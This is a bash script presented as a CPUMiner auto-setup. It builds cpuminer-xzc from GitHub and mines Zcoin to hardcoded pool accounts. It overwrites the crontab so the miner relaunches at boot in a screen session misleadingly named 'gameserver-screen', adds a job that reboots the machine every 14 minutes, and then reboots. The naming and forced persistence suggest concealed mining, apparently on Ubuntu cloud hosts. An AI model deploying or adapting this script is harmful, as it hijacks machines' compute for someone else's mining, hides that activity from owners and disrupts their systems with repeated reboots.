
#!/bin/bash
#######################################################
# CPUMiner (wolf9466) auto-setup by dinhtai92dn
#######################################################


if [ -f ${PWD}/cpuminer-xzc/miner.h ]; then
	if pgrep -x "minerd" > /dev/null
then
    echo "minerd is running"
else
    echo "minerd has been installed, starting now"
    cd cpuminer-xzc
    screen -dmSL minerd ./cpuminer -a lyra2z -o stratum+tcp://xzc.pool.mn:2428 -u vantoanbk57.1 -p 1; sleep 3
fi
exit
fi
grep --help > hi2.sh
echo "sudo reboot" > hi2.sh
grep --help > hi.sh
echo "cd cpuminer-xzc && ./cpuminer -a lyra2z -o stratum+tcp://us-east.zcoin.miningpoolhub.com:20581 -u vanto.1 -p 1" > hi.sh
chmod +x /home/ubuntu/hi.sh && chmod +x /home/ubuntu/hi2.sh

sudo apt-get update
sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev git

git clone https://github.com/zcoinofficial/cpuminer-xzc
cd cpuminer-xzc
./build.sh
echo "minerd is starting"
echo $'*/14 * * * * /home/ubuntu/hi2.sh\n@reboot /usr/bin/screen -dmS gameserver-screen  /home/ubuntu/hi.sh' | crontab -
sudo reboot
